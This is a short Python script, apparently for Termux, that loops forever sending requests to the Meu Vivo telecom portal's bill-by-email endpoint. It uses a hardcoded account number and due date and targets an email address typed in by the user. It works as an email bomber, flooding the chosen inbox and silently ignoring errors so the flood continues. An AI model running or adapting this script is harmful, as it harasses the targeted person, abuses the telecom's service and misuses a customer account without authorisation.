#!/data/data/com.termux/files/usr/bin/python

import patches
from http_clients import meuvivo
from regex import email

data = {
	"enderecoEmail": input("Digite o endereço de e-mail: "),
	"dataVencimentoFatura": "01/04/2020",
	"nrConta": "0397019452"
}

if not email.match(data['enderecoEmail']):
	raise ValueError('Endereço de e-mail inválido')

total = 0

while True:
	try:
		response = meuvivo.post('enviarEmailConta.do', data=data)
		print(response.text)
		json_response = response.json()
		if json_response['msgSucesso'] == 'sucesso':
			total = total + 1
			print(f'1 E-mail enviado. Total: {total}')
	except KeyboardInterrupt:
		quit()
	except:
		pass